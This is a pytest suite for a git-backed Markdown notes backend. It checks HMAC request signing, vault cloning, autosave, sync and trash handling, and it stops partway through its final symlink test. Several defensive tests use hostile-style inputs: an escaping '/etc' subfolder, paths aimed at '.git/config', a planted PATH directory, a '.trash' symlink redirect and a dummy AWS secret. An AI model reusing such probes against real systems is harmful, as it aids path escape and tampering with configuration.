"""Tests for the Notes (md-notebook) builtin backend.

Ported from the app's Node suite (``backend/test/server.test.mjs`` plus the
core-git and core-notes package tests), with added coverage for the proxy-HMAC
gate that the external app did not have.

Every request is signed the way the gateway signs it, so the auth middleware is
exercised on each call rather than bypassed. The folder picker is disabled via
``MD_NOTEBOOK_NO_PICKER`` so no GUI dialog can ever open during a run.
"""
from __future__ import annotations

import asyncio
import hashlib
import hmac
import importlib
import json
import os
import shutil
import subprocess
import threading
import time
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Any, AsyncIterator, Callable, Optional

import pytest
import yarl
from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer
from windows_sim import replace_sharing_violation

from conftest import requires_symlinks
from kiro_crew import atomic_write as atomic_write_mod
from kiro_crew import platform_compat
from kiro_crew.apps.builtins.md_notebook import git_ops

SECRET = "test-proxy-secret"


"""Env that makes a git call hermetic regardless of fixture scope.

``test/conftest.py``'s ``_git_identity`` closes the same two host bleeds (identity,
and ``~/.gitconfig`` reaching in via e.g. ``core.excludesFile``), but it is autouse
and FUNCTION-scoped -- so the session-scoped template builder below runs before it and
would otherwise read the developer's real global config. Applied here explicitly
rather than widening that fixture's scope, which would stop it reverting per test.
"""
_GIT_ENV = {
    "GIT_AUTHOR_NAME": "Test",
    "GIT_AUTHOR_EMAIL": "test@example.invalid",
    "GIT_COMMITTER_NAME": "Test",
    "GIT_COMMITTER_EMAIL": "test@example.invalid",
    "GIT_CONFIG_GLOBAL": os.devnull,
    "GIT_CONFIG_SYSTEM": os.devnull,
}


def _git(*args: str, cwd: Path) -> str:
    """Run git in a fixture repo, failing loudly on error."""
    return subprocess.run(
        ["git", *args],
        cwd=cwd,
        capture_output=True,
        text=True,
        check=True,
        env={**os.environ, **_GIT_ENV},
    ).stdout.strip()


def _build_seed_repo(base: Path) -> None:
    """Create a bare remote plus a working checkout holding two notes, under *base*."""
    remote = base / "remote.git"
    _git("init", "--bare", "-b", "main", str(remote), cwd=base)
    seed = base / "seed"
    seed.mkdir()
    _git("init", "-b", "main", ".", cwd=seed)
    _git("config", "user.email", "test@example.invalid", cwd=seed)
    _git("config", "user.name", "Test", cwd=seed)
    (seed / "One.md").write_text("# One\n\nlinks to [[Two]]\n", encoding="utf-8")
    (seed / "sub").mkdir()
    (seed / "sub" / "Two.md").write_text("---\ntitle: Two\n---\n\nbody #tag\n", encoding="utf-8")
    _git("add", "-A", cwd=seed)
    _git("commit", "-m", "seed", cwd=seed)
    _git("remote", "add", "origin", str(remote), cwd=seed)
    _git("push", "-u", "origin", "main", cwd=seed)


@pytest.fixture(scope="session")
def _seed_template(tmp_path_factory: pytest.TempPathFactory) -> Path:
    """Build the seed repo pair once per session; tests get a copy.

    ``_build_seed_repo`` spawns nine git subprocesses, and ``fixtures`` is
    function-scoped over 120 tests -- ~1.6s of setup each, which made this the most
    expensive file in the suite. Copying a prebuilt tree is ~5x cheaper.

    Session scope is safe because the template is never yielded to a test, only
    copied from, so no test can reach another's repo.
    """
    template = tmp_path_factory.mktemp("md-notebook-seed")
    _build_seed_repo(template)
    return template


def _seed_repo(base: Path, template: Path) -> tuple[Path, Path]:
    """Copy the session seed *template* into *base*, returning ``(remote, seed)``.

    ``git`` records the remote as an absolute path, so the copied checkout is
    re-pointed at the copied bare remote rather than the template's -- otherwise
    every test would push into one shared remote and see each other's commits.
    """
    remote, seed = base / "remote.git", base / "seed"
    shutil.copytree(template / "remote.git", remote)
    shutil.copytree(template / "seed", seed)
    _git("remote", "set-url", "origin", str(remote), cwd=seed)
    return remote, seed


class SignedClient:
    """Wraps a TestClient, signing each request as the gateway would."""

    def __init__(self, client: TestClient) -> None:
        self._client = client

    def _headers(self, method: str, target: str, body: bytes) -> dict[str, str]:
        ts = str(int(time.time()))
        digest = hashlib.sha256(body).hexdigest()
        msg = f"{ts}:{method}:{target}:{digest}"
        sig = hmac.new(SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()
        return {"X-KiroCrew-Proxy": f"{ts}:{sig}"}

    async def request(
        self, method: str, path: str, payload: Optional[dict[str, Any]] = None
    ) -> tuple[int, Any]:
        body = json.dumps(payload).encode() if payload is not None else b""
        # Sign the WIRE form of the target, as the gateway does: yarl requotes
        # the human-readable path (e.g. a space becomes %20), and raw_path_qs
        # is the exact request-target the client puts on the wire.
        url = yarl.URL(path)
        headers = self._headers(method, url.raw_path_qs, body)
        if payload is not None:
            headers["Content-Type"] = "application/json"
        resp = await self._client.request(method, url, data=body or None, headers=headers)
        try:
            return resp.status, await resp.json()
        except Exception:  # noqa: BLE001 — a non-JSON body is itself the failure
            return resp.status, await resp.text()

    async def get(self, path: str) -> tuple[int, Any]:
        return await self.request("GET", path)

    async def post(self, path: str, payload: Optional[dict] = None) -> tuple[int, Any]:
        return await self.request("POST", path, payload or {})

    async def put(self, path: str, payload: Optional[dict] = None) -> tuple[int, Any]:
        return await self.request("PUT", path, payload or {})

    async def delete(self, path: str) -> tuple[int, Any]:
        return await self.request("DELETE", path)


@pytest.fixture
def fixtures(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, _seed_template: Path):
    """A fresh backend module bound to a temp home, plus git fixture repos."""
    monkeypatch.setenv("MD_NOTEBOOK_HOME", str(tmp_path / "home"))
    # The PAT lives under the crew data home (config_dir), never MD_NOTEBOOK_HOME,
    # so isolate KIROCREW_HOME too or tests would touch the real ~/.kiro/crew.
    monkeypatch.setenv("KIROCREW_HOME", str(tmp_path / "crew"))
    monkeypatch.setenv("KIROCREW_PROXY_SECRET", SECRET)
    monkeypatch.setenv("MD_NOTEBOOK_NO_PICKER", "1")
    from kiro_crew.apps.builtins.md_notebook import server as server_mod

    # HOME and friends are resolved at import time, so rebind them to the temp
    # home rather than relying on import order.
    server_mod = importlib.reload(server_mod)
    remote, seed = _seed_repo(tmp_path, _seed_template)
    return server_mod, remote, seed


@asynccontextmanager
async def signed_client(server_mod) -> AsyncIterator[SignedClient]:
    """A signed test client for a backend module.

    An `async with` helper rather than an `@pytest_asyncio.fixture`: the pinned
    pytest-asyncio (0.20.3) cannot drive async fixtures under the pinned pytest
    (8.4.1) — its wrapper reads `fixturedef.unittest`, removed in pytest 8.1 —
    so the suite avoids async fixtures by convention.
    """
    app = server_mod.create_app()
    async with TestClient(TestServer(app)) as c:
        yield SignedClient(c)


async def _clone(client: SignedClient, remote: Path, **extra: Any) -> dict[str, Any]:
    status, body = await client.post("/api/vaults", {"url": str(remote), **extra})
    assert status == 200, body
    return body["vault"]


# ---------------------------------------------------------------------------
# Health and auth
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_health_advertises_features(fixtures) -> None:
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, body = await client.get("/api/health")
        assert status == 200
        assert body["ok"] is True
        # The UI compares this list to detect a backend older than the page.
        for feature in (
            "createdAt",
            "attach",
            "saveGuard",
            "knowledge",
            "pickFolder",
            "settings",
            "autoSyncLoop",
        ):
            assert feature in body["features"]


@pytest.mark.asyncio
async def test_unsigned_request_is_rejected(fixtures, monkeypatch) -> None:
    """An unsigned caller must not reach the API, only the liveness probe —
    and the denial must leave a SEL audit record (an unsigned local process
    probing this backend is exactly what the trail exists to catch)."""
    server_mod, _remote, _seed = fixtures
    audited: list[dict] = []

    class _SelSpy:
        def log_api_access(self, **kw) -> None:
            audited.append(kw)

    monkeypatch.setattr(server_mod, "sel", lambda: _SelSpy())
    app = server_mod.create_app()
    async with TestClient(TestServer(app)) as raw:
        resp = await raw.get("/api/vaults")
        assert resp.status == 401
        assert audited and audited[0]["operation"] == "proxy_auth_failed"
        assert audited[0]["outcome"] == "denied"
        assert audited[0]["resources"] == "/api/vaults"
        # The gateway's own health poll is unsigned by design — and not audited.
        audited.clear()
        assert (await raw.get("/health")).status == 200
        assert audited == []


@pytest.mark.asyncio
async def test_tampered_signature_is_rejected(fixtures) -> None:
    server_mod, _remote, _seed = fixtures
    app = server_mod.create_app()
    async with TestClient(TestServer(app)) as raw:
        resp = await raw.get(
            "/api/vaults", headers={"X-KiroCrew-Proxy": f"{int(time.time())}:deadbeef"}
        )
        assert resp.status == 401


def _sign_wire_target(method: str, wire_target: str, body: bytes = b"") -> dict[str, str]:
    """Sign exactly as the gateway does (apps/routes.py::handle_app_api_proxy):
    over the RAW, percent-encoded request-target, never a decoded form."""
    ts = str(int(time.time()))
    digest = hashlib.sha256(body).hexdigest()
    msg = f"{ts}:{method}:{wire_target}:{digest}"
    sig = hmac.new(SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()
    return {"X-KiroCrew-Proxy": f"{ts}:{sig}"}


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "wire_target",
    [
        "/api/health?path=/tmp/my%20notes.md",  # space
        "/api/health?path=/tmp/caf%C3%A9.md",  # non-ASCII
        "/api/health?path=/tmp/my+notes.md",  # '+' (decodes to space in query)
    ],
)
async def test_gateway_signed_escapable_query_verifies(fixtures, wire_target: str) -> None:
    """A query parameter needing percent-escaping (a note path with a space or
    non-ASCII character) must verify: the middleware has to recompute the HMAC
    over the same RAW request-target the gateway signed, not aiohttp's decoded
    path + query_string reconstruction (issue: note reads 401ing while plain
    listings pass)."""
    server_mod, _remote, _seed = fixtures
    app = server_mod.create_app()
    async with TestClient(TestServer(app)) as raw:
        # encoded=True keeps the exact signed bytes on the wire, mirroring the
        # gateway's yarl.URL(..., encoded=True) forwarding.
        url = yarl.URL(wire_target, encoded=True)
        resp = await raw.get(url, headers=_sign_wire_target("GET", wire_target))
        assert resp.status == 200, await resp.text()


@pytest.mark.asyncio
async def test_gateway_signed_no_query_target_verifies(fixtures) -> None:
    """Without a query string neither side appends a '?' — the raw and decoded
    spellings coincide and the signature must still verify."""
    server_mod, _remote, _seed = fixtures
    app = server_mod.create_app()
    async with TestClient(TestServer(app)) as raw:
        resp = await raw.get("/api/health", headers=_sign_wire_target("GET", "/api/health"))
        assert resp.status == 200, await resp.text()


# ---------------------------------------------------------------------------
# Vaults
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_clone_vault(fixtures) -> None:
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        assert vault["branch"] == "main"
        assert vault["readOnly"] is False
        status, body = await client.get("/api/vaults")
        assert status == 200
        assert len(body["vaults"]) == 1
        # A vault this app cloned is not "external".
        assert body["vaults"][0]["external"] is False


@pytest.mark.asyncio
async def test_clone_requires_url(fixtures) -> None:
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, body = await client.post("/api/vaults", {})
        assert status == 400
        assert "url" in body["error"]


@pytest.mark.asyncio
async def test_clone_with_escaping_subfolder_leaves_no_orphan(fixtures) -> None:
    """An escaping subfolder must be rejected before the clone writes to disk.

    Validating only after clone_vault would leave an orphaned checkout under the
    clone root that nothing persists or cleans up.
    """
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, _ = await client.post(
            "/api/vaults", {"url": str(remote), "subfolder": "/etc"}
        )
        assert status == 400
        _, listing = await client.get("/api/vaults")
        assert listing["vaults"] == []
        clone_root = server_mod._clone_root()
        leftovers = list(clone_root.iterdir()) if clone_root.exists() else []
        assert leftovers == [], f"clone left an orphan checkout: {leftovers}"


@pytest.mark.asyncio
async def test_attach_existing_checkout(fixtures) -> None:
    _mod, _remote, seed = fixtures
    async with signed_client(_mod) as client:
        status, body = await client.post("/api/vaults/attach", {"path": str(seed)})
        assert status == 200, body
        assert body["vault"]["localPath"] == str(seed)
        status, listing = await client.get("/api/vaults")
        # Attached in place, so it reads as external rather than app-cloned.
        assert listing["vaults"][0]["external"] is True


@pytest.mark.asyncio
async def test_attach_accepts_a_repo_with_no_remote(fixtures, tmp_path: Path) -> None:
    """A `git init` folder with no origin is a valid local-only vault.

    Requiring a remote made the most ordinary local notes folder unusable, and
    the app's own features (listing, search, trash, local history) need no
    remote at all.
    """
    server_mod, _remote, _seed = fixtures
    local = tmp_path / "local-only"
    local.mkdir()
    _git("init", "-b", "main", ".", cwd=local)
    _git("config", "user.email", "test@example.invalid", cwd=local)
    _git("config", "user.name", "Test", cwd=local)
    (local / "Solo.md").write_text("# Solo\n", encoding="utf-8")
    _git("add", "-A", cwd=local)
    _git("commit", "-m", "seed", cwd=local)

    async with signed_client(server_mod) as client:
        status, body = await client.post("/api/vaults/attach", {"path": str(local)})
        assert status == 200, body
        vault = body["vault"]
        assert vault["localOnly"] is True
        assert vault["remoteUrl"] is None
        assert vault["repo"] == ""
        # Falls back to the folder name, since there is no repo name to take.
        assert vault["name"] == "local-only"
        # And the notes are readable like any other vault.
        paths = [n["path"] for n in (await client.get("/api/notes"))[1]["notes"]]
        assert "Solo.md" in paths


@pytest.mark.asyncio
async def test_sync_on_a_local_only_vault_commits_without_pushing(
    fixtures, tmp_path: Path
) -> None:
    """Sync degrades to a local commit: no fetch, no push, no error."""
    server_mod, _remote, _seed = fixtures
    local = tmp_path / "local-only"
    local.mkdir()
    _git("init", "-b", "main", ".", cwd=local)
    _git("config", "user.email", "test@example.invalid", cwd=local)
    _git("config", "user.name", "Test", cwd=local)
    (local / "Solo.md").write_text("# Solo\n", encoding="utf-8")
    _git("add", "-A", cwd=local)
    _git("commit", "-m", "seed", cwd=local)

    async with signed_client(server_mod) as client:
        assert (await client.post("/api/vaults/attach", {"path": str(local)}))[0] == 200
        assert (
            await client.put("/api/note", {"path": "Solo.md", "content": "# Solo\n\nedited\n"})
        )[0] == 200
        status, body = await client.post("/api/sync")
        assert status == 200, body
        result = body["result"]
        assert result["localOnly"] is True
        assert result["pushed"] is False
        assert result["conflicts"] == []
        assert [c["path"] for c in result["committed"]] == ["Solo.md"]
        # The edit really is in local history, and the tree is clean after.
        assert "edited" in _git("show", "HEAD:Solo.md", cwd=local)
        assert _git("status", "--porcelain", cwd=local) == ""


@pytest.mark.asyncio
async def test_local_only_sync_refuses_a_remote_that_appeared_later(
    fixtures, tmp_path: Path
) -> None:
    """`.git/config` is agent-writable, so an origin appearing after attach is
    not a user decision — refusing is what keeps note history from being pushed
    to a remote the vault was never connected to."""
    server_mod, remote, _seed = fixtures
    local = tmp_path / "local-only"
    local.mkdir()
    _git("init", "-b", "main", ".", cwd=local)
    _git("config", "user.email", "test@example.invalid", cwd=local)
    _git("config", "user.name", "Test", cwd=local)
    (local / "Solo.md").write_text("# Solo\n", encoding="utf-8")
    _git("add", "-A", cwd=local)
    _git("commit", "-m", "seed", cwd=local)

    async with signed_client(server_mod) as client:
        assert (await client.post("/api/vaults/attach", {"path": str(local)}))[0] == 200
        _git("remote", "add", "origin", str(remote), cwd=local)
        status, body = await client.post("/api/sync")
        assert status >= 400, body
        assert "no git remote" in body["error"]


@pytest.mark.asyncio
async def test_commit_route_saves_to_local_history_without_pushing(fixtures) -> None:
    """The periodic autosave: pending edits reach local git history, and the
    remote is left exactly where it was."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        remote_before = _git("rev-parse", "HEAD", cwd=Path(remote))
        assert (
            await client.put("/api/note", {"path": "One.md", "content": "# One\n\nautosaved\n"})
        )[0] == 200
        status, body = await client.post("/api/commit")
        assert status == 200, body
        result = body["result"]
        assert result["commitOnly"] is True
        assert result["pushed"] is False
        assert [c["path"] for c in result["committed"]] == ["One.md"]
        assert "autosaved" in _git("show", "HEAD:One.md", cwd=root)
        # Nothing left the machine.
        assert _git("rev-parse", "HEAD", cwd=Path(remote)) == remote_before


@pytest.mark.asyncio
async def test_autosave_leaves_a_partially_staged_note_alone(fixtures) -> None:
    """A note staged with `git add -p` holds content the user deliberately held back.

    Autosave's `git add` would overwrite that index entry with the full working copy
    and commit it, so text they kept out of the commit is committed by a timer they
    never triggered. Other notes in the same tick must still be saved, and an
    explicit Sync must still take it.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        (root / "One.md").write_text("# One\n\nstaged line\n", encoding="utf-8")
        _git("add", "One.md", cwd=root)
        staged_blob = _git("rev-parse", ":One.md", cwd=root)
        (root / "One.md").write_text("# One\n\nstaged line\nheld back\n", encoding="utf-8")
        # An unrelated note changed in the same tick.
        put = await client.put("/api/note", {"path": "Two.md", "content": "# Two\n\nedited\n"})
        assert put[0] == 200, put

        status, body = await client.post("/api/commit")
        assert status == 200, body
        # Two.md saved; One.md left for the user's own commit.
        assert [c["path"] for c in body["result"]["committed"]] == ["Two.md"]
        assert "held back" not in _git("show", "HEAD:One.md", cwd=root)
        # The staging boundary is intact: the index still holds THEIR revision.
        assert _git("rev-parse", ":One.md", cwd=root) == staged_blob

        # A deliberate Sync is the user choosing the moment, so it takes it.
        sync_status, sync_body = await client.post("/api/sync")
        assert sync_status == 200, sync_body
        assert "held back" in _git("show", "HEAD:One.md", cwd=root)


@pytest.mark.asyncio
async def test_autosave_leaves_a_fully_staged_note_in_its_pending_commit(fixtures) -> None:
    """A FULLY staged note is a file the user put into a commit they are composing.

    No content would be lost, but `git commit -- <path>` commits that path ALONE,
    lifting it out of the multi-file commit being assembled — the composition is
    destroyed silently. So the filter tests "is it staged", not "does the index
    differ from the working tree".
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        # A multi-file commit in progress: a note and a sibling file, both staged
        # with the working tree matching the index (no `add -p` divergence).
        (root / "One.md").write_text("# One\n\nfor my commit\n", encoding="utf-8")
        (root / "notes.txt").write_text("part of the same commit\n", encoding="utf-8")
        _git("add", "One.md", "notes.txt", cwd=root)
        head_before = _git("rev-parse", "HEAD", cwd=root)
        # An unrelated note changed in the same tick, so the tick is not a no-op.
        put = await client.put("/api/note", {"path": "Two.md", "content": "# Two\n\nedited\n"})
        assert put[0] == 200, put

        status, body = await client.post("/api/commit")
        assert status == 200, body
        assert [c["path"] for c in body["result"]["committed"]] == ["Two.md"]
        # One.md is still theirs to commit: absent from HEAD, still staged.
        assert "for my commit" not in _git("show", "HEAD:One.md", cwd=root)
        assert _git("rev-parse", "HEAD", cwd=root) != head_before
        staged_now = _git("diff", "--cached", "--name-only", cwd=root).split()
        assert sorted(staged_now) == ["One.md", "notes.txt"]


@pytest.mark.asyncio
async def test_commit_route_is_a_no_op_on_a_clean_vault(fixtures) -> None:
    """An autosave tick with nothing to save must not create an empty commit."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        before = _git("rev-parse", "HEAD", cwd=Path(vault["localPath"]))
        status, body = await client.post("/api/commit")
        assert status == 200, body
        assert body["result"]["committed"] == []
        assert _git("rev-parse", "HEAD", cwd=Path(vault["localPath"])) == before


@pytest.mark.asyncio
async def test_commit_route_still_works_when_the_remote_drifted(fixtures) -> None:
    """Autosave must not stop because the user repointed their own remote.

    An explicit sync refuses a drifted remote (it would push to an unexpected
    place); a commit-only run cannot push at all, so blocking it would only cost
    the user their history.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        _git("remote", "set-url", "origin", "https://example.invalid/other.git", cwd=root)
        assert (
            await client.put("/api/note", {"path": "One.md", "content": "# One\n\nstill saved\n"})
        )[0] == 200
        status, body = await client.post("/api/commit")
        assert status == 200, body
        assert [c["path"] for c in body["result"]["committed"]] == ["One.md"]
        # ...while the pushing path refuses exactly this situation.
        sync_status, sync_body = await client.post("/api/sync")
        assert sync_status >= 400, sync_body
        assert "trusted URL" in sync_body["error"]


@pytest.mark.asyncio
async def test_every_path_route_refuses_non_note_paths(fixtures) -> None:
    """Containment is not enough: a vault holds far more than notes.

    `.git/config` is INSIDE the vault, so `safe_join` allows it. A delete would move
    the repository's configuration to `.trash/config.md` — breaking the vault and its
    remote binding for every later operation — and save/move/duplicate reach the same
    places. The addressable surface is pinned to the LISTED surface: undotted
    components, `.md` suffix.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        before = (root / ".git" / "config").read_text(encoding="utf-8")

        # Every route that takes a caller-supplied path, with the same payload.
        assert (await client.get("/api/note?path=.git/config"))[0] == 400
        assert (await client.delete("/api/note?path=.git/config"))[0] == 400
        assert (await client.put("/api/note", {"path": ".git/config", "content": "x"}))[0] == 400
        assert (await client.post("/api/note/duplicate", {"path": ".git/config"}))[0] == 400
        assert (await client.post("/api/note/move", {"from": ".git/config", "to": "x.md"}))[0] == 400
        assert (
            await client.post("/api/note/move", {"from": "One.md", "to": ".git/config"})
        )[0] == 400
        # A note-shaped name inside a dotted directory is refused too — the rule is
        # the component, not the extension alone.
        assert (await client.delete("/api/note?path=.trash/One.md"))[0] == 400
        # ...and a new note cannot be created into a dotted folder.
        assert (await client.post("/api/note/new", {"folder": ".git"}))[0] == 400

        # Nothing moved, nothing was written, and the vault still works.
        assert (root / ".git" / "config").read_text(encoding="utf-8") == before
        assert not (root / git_ops.TRASH_DIR).exists()
        assert (await client.get("/api/notes"))[0] == 200


@pytest.mark.asyncio
async def test_reveal_pins_path_so_a_planted_helper_cannot_run(monkeypatch) -> None:
    """`xdg-open` dispatches through PATH, so PATH must not be the inherited one.

    It is a shell script that runs whichever of `gio` / `gvfs-open` / `exo-open` it
    finds first. The gateway's PATH can include an agent-writable directory such as
    `~/.local/bin`, so a planted `gio` there would execute with the backend's
    environment the moment the user clicks the delete dialog's `.trash` link.
    """
    if os.name != "posix":
        pytest.skip("PATH is deliberately left inherited on Windows")
    from kiro_crew.apps.builtins.md_notebook import server as server_mod

    captured: dict[str, Any] = {}

    def fake_run(argv, **kwargs):  # type: ignore[no-untyped-def]
        captured["argv"] = argv
        captured["env"] = kwargs.get("env")
        return subprocess.CompletedProcess(argv, 0, "", "")

    monkeypatch.setattr(server_mod, "_reveal_binary", lambda: "/usr/bin/true")
    monkeypatch.setenv("PATH", f"/tmp/planted{os.pathsep}/usr/bin")
    monkeypatch.setattr(server_mod.subprocess, "run", fake_run)

    server_mod._reveal_folder_sync("/tmp")

    assert captured["env"]["PATH"] == git_ops.TRUSTED_PATH
    assert "/tmp/planted" not in captured["env"]["PATH"]
    # Only PATH is replaced — the session variables the file manager needs to
    # reach the running desktop must survive.
    monkeypatch.setenv("DISPLAY", ":0")
    server_mod._reveal_folder_sync("/tmp")
    assert captured["env"]["DISPLAY"] == ":0"


def test_every_spawn_in_this_module_pins_path() -> None:
    """The pin is an invariant of the module, not of one call site.

    `_gh_token_sync` (mints a token), `_reveal_folder_sync` and `_pick_folder_sync`
    all spawn a POSIX process that resolves child helpers through PATH. A new
    `subprocess.run` added without `env=_trusted_env()` would silently reopen the
    hole, so the count is asserted rather than left to review.
    """
    from kiro_crew.apps.builtins.md_notebook import server as server_mod

    source = Path(server_mod.__file__).read_text(encoding="utf-8")
    assert source.count("subprocess.run(") == source.count("env=_trusted_env(),")


@pytest.mark.asyncio
async def test_trash_open_reports_an_absent_trash_instead_of_creating_one(fixtures) -> None:
    """Nothing deleted yet: say so rather than conjuring an empty folder.

    Creating the directory just to have something to reveal would also be the one
    write this read-shaped route makes.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        status, body = await client.post("/api/trash/open")
        assert status == 200, body
        assert body["empty"] is True
        assert body["opened"] is False
        assert body["path"].endswith(git_ops.TRASH_DIR)
        assert not (Path(vault["localPath"]) / git_ops.TRASH_DIR).exists()


@pytest.mark.asyncio
async def test_trash_open_reveals_the_vaults_own_trash(fixtures, monkeypatch) -> None:
    """After a delete, the route hands the vault's OWN trash to the file manager.

    The reveal is stubbed — a real one would open Finder during the test run. What
    is asserted is the path the route chose, because that is the security-relevant
    part: the request carries no path, so this must be derived from the vault.
    """
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        assert (await client.delete("/api/note?path=One.md"))[0] == 200
        revealed: list[str] = []
        monkeypatch.setattr(server_mod, "_reveal_binary", lambda: "/usr/bin/true")
        monkeypatch.setattr(server_mod, "_reveal_folder_sync", revealed.append)
        status, body = await client.post("/api/trash/open")
        assert status == 200, body
        assert body["opened"] is True
        expected = str(Path(vault["localPath"]) / git_ops.TRASH_DIR)
        assert revealed == [expected]
        assert body["path"] == expected


@pytest.mark.asyncio
async def test_trash_open_of_a_scoped_vault_stays_inside_the_scope(
    fixtures, monkeypatch
) -> None:
    """A subfolder-scoped vault's trash lives in the SCOPE, not the repo root —
    the same containment every other note path follows."""
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote, subfolder="sub")
        assert (await client.delete("/api/note?path=Two.md"))[0] == 200
        revealed: list[str] = []
        monkeypatch.setattr(server_mod, "_reveal_binary", lambda: "/usr/bin/true")
        monkeypatch.setattr(server_mod, "_reveal_folder_sync", revealed.append)
        status, body = await client.post("/api/trash/open")
        assert status == 200, body
        assert revealed == [str(Path(vault["localPath"]) / "sub" / git_ops.TRASH_DIR)]


@pytest.mark.asyncio
async def test_trash_open_says_unsupported_when_no_file_manager_exists(
    fixtures, monkeypatch
) -> None:
    """A minimal Linux container has no xdg-open: that is a 501 the UI explains,
    not a 500."""
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        await _clone(client, remote)
        assert (await client.delete("/api/note?path=One.md"))[0] == 200
        monkeypatch.setattr(server_mod, "_reveal_binary", lambda: None)
        status, body = await client.post("/api/trash/open")
        assert status == 501, body
        assert body["code"] == "folder_open_unsupported"


@pytest.mark.asyncio
async def test_autosave_commits_notes_only(fixtures) -> None:
    """An UNATTENDED commit must not capture whatever else sits in the vault.

    A user who drops a temporary secret into the vault and means to remove it
    before syncing would otherwise find a timer had already written it into local
    history — and the next push puts that blob on the remote for good.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        (root / "secrets.env").write_text("AWS_SECRET=hunter2\n", encoding="utf-8")
        assert (
            await client.put("/api/note", {"path": "One.md", "content": "# One\n\nedited\n"})
        )[0] == 200

        status, body = await client.post("/api/commit")
        assert status == 200, body
        assert [c["path"] for c in body["result"]["committed"]] == ["One.md"]
        # The note is in history; the stray file is still only on disk.
        assert "edited" in _git("show", "HEAD:One.md", cwd=root)
        tracked = _git("ls-files", cwd=root)
        assert "secrets.env" not in tracked
        assert _git("status", "--porcelain", cwd=root).strip() == "?? secrets.env"


@pytest.mark.asyncio
async def test_explicit_sync_still_commits_the_whole_scope(fixtures) -> None:
    """The narrowing above is for the TIMER only — a user-initiated sync keeps its
    existing whole-scope behaviour, because the user chose that moment."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        (root / "attachment.png").write_bytes(b"\x89PNG\r\n")
        status, body = await client.post("/api/sync")
        assert status == 200, body
        assert "attachment.png" in [c["path"] for c in body["result"]["committed"]]


@pytest.mark.asyncio
async def test_notes_only_sync_still_pushes_but_excludes_non_notes(fixtures) -> None:
    """The background loop's `notes_only=True` decouples notes-only STAGING from
    `commit_only`'s stop-before-push. So a timed sync must (1) leave a stray
    non-note file out of history and off the remote, yet (2) still push the note
    edit — otherwise it would silently be a local-only commit and 'Synced N ago'
    would lie."""
    mod, remote, _seed = fixtures
    async with signed_client(mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        (root / "secrets.env").write_text("AWS_SECRET=hunter2\n", encoding="utf-8")
        assert (
            await client.put("/api/note", {"path": "One.md", "content": "# One\n\ntimed\n"})
        )[0] == 200

    result = await git_ops.sync(str(root), notes_only=True)

    assert result["pushed"] is True, result
    assert [c["path"] for c in result["committed"]] == ["One.md"]
    # The note reached the remote; the stray file entered neither history nor push.
    assert "timed" in _git("show", "HEAD:One.md", cwd=remote)
    assert "secrets.env" not in _git("ls-files", cwd=root)
    assert _git("status", "--porcelain", cwd=root).strip() == "?? secrets.env"


@pytest.mark.asyncio
async def test_autosave_of_a_scoped_vault_stays_in_scope(fixtures) -> None:
    """Notes-only staging names each path individually; they must all still be
    inside the vault's subfolder scope."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote, subfolder="sub")
        root = Path(vault["localPath"])
        (root / "Outside.md").write_text("# outside the scope\n", encoding="utf-8")
        assert (
            await client.put("/api/note", {"path": "Two.md", "content": "---\ntitle: Two\n---\n\nx\n"})
        )[0] == 200

        status, body = await client.post("/api/commit")
        assert status == 200, body
        assert [c["path"] for c in body["result"]["committed"]] == ["sub/Two.md"]
        assert "Outside.md" not in _git("ls-files", cwd=root)


@requires_symlinks
@pytest.mark.asyncio
async def test_delete_refuses_an_in_vault_trash_symlink(fixtures) -> None:
    """Containment is not the test for `.trash` — being a symlink at all is.

    A clone can carry `.trash -> public`, whose target is INSIDE the vault, so the
    escape check passes. `mkdir(exist_ok=True)` then follows the link and the note
    lands at `public/One.md` — a path `git_ops.status()` does not filter (it filters
    the `.trash/` prefix), so the next sync commits and pushes the deleted note. The
    promise that a trashed note never leaves the machine breaks without the write
    ever leaving the vault.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        (root / "public").mkdir()
        # Directory redirect: a symlink on POSIX, a junction on non-admin Windows
        # — the guard must refuse both (is_link_or_junction), else it is
        # POSIX-only and a Windows junction slips a trashed note into `public/`.
        platform_compat.symlink_or_junction(str(root / "public"), str(root / git_ops.TRASH_DIR))

        status, body = await client.delete("/api/note?path=One.md")
        assert status >= 400, body
        assert "symlink" in body["error"]
        # The note stayed put and nothing was written through the link.
